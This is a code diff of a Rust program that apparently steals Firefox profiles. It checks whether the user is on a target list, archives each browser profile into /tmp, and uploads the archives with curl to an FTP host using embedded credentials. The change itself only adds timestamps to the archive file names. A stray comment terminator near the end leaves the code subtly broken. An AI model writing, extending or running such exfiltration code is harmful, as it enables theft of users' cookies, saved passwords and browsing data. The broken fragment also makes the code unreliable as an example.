@@ -2,6 +2,7 @@ use std::fs;
 use std::process;
 use std::path::Path;
 use std::path::PathBuf;
+use std::time::{SystemTime, UNIX_EPOCH};
 
 fn run_command(command : &str, argument : &str) -> String {
     let output_utf8 = process::Command::new(command)
@@ -35,6 +36,10 @@ fn main() {
     let profiles      : Vec<String> = get_profile_path(firefox_path.to_path_buf());
     let targets_vec   : Vec<&str>   = targets.lines().collect();
     let in_target     : bool        = targets_vec.contains(&&*username);
+    let time_now      : SystemTime  = SystemTime::now();
+    let mut time      : String      = format!("{:?}", time_now.duration_since(UNIX_EPOCH).unwrap());
+
+    time.split_off(10);
 
     if !in_target || !Path::new(firefox_path).exists() {
         process::exit(1);
@@ -44,18 +49,18 @@ fn main() {
     for (index, profile) in profiles.iter().enumerate() {
         process::Command::new("tar")
         .arg("cjf")
-        .arg(format!("/tmp/{}-{}.tar.bz2", username, index+1))
+        .arg(format!("/tmp/{}-{}-{}.tar.bz2", username, index+1, time))
         .arg(format!("{}", profile))
         .spawn()
         .expect("Failed to execute");
-
+        
         process::Command::new("curl")
         .arg("-sT")
-        .arg(format!("/tmp/{}-{}.tar.bz2", username, index+1))
+        .arg(format!("/tmp/{}-{}-{}.tar.bz2", username, index+1, time))
         .arg("ftp://host/directory/")
         .arg("--user")
         .arg("username:password")
         .spawn()
-        .expect("Failed to execute");
+        .expect("Failed to execute");*/
     }
 }
